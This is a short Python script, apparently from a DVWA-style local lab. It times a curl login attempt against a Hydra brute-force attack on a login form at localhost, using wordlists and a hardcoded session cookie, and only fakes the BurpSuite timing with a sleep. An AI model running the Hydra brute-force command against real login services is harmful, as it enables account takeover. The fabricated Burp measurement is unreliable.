import subprocess
import time

url = "http://localhost:8081/vulnerabilities/brute/"
phpsessid = "pc3uk0kjgcq02ufjvao68okmd5" 
security = "low"

usuario = "admin"
password = "password"

usuarios_file = "usuarios.txt"
passwords_file = "passwords.txt"

curl_cmd = [
    "curl", "-s", "-o", "/dev/null", "-w", "%{time_total}",
    f"{url}?username={usuario}&password={password}&Login=Login",
    "-H", f"Cookie: PHPSESSID={phpsessid}; security={security}"
]

hydra_cmd = [
    "hydra", "-L", usuarios_file, "-P", passwords_file,
    f"http-get-form://localhost:8081/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID={phpsessid}; security={security}:F=Username and/or password incorrect."
]

print("Comparando rendimiento de métodos...")

start_curl = time.time()
subprocess.run(curl_cmd)
end_curl = time.time()
tiempo_curl = end_curl - start_curl

start_hydra = time.time()
subprocess.run(hydra_cmd)
end_hydra = time.time()
tiempo_hydra = end_hydra - start_hydra

print("Simulando uso de BurpSuite... (esperando 5 segundos)")
start_burp = time.time()
time.sleep(5) 
end_burp = time.time()
tiempo_burp = end_burp - start_burp

print("\n🔎 Resultados de comparación:")
print(f"🧰 curl      → {tiempo_curl:.2f} segundos")
print(f"🔨 hydra     → {tiempo_hydra:.2f} segundos")
print(f"👀 burpsuite → {tiempo_burp:.2f} segundos (simulado)")
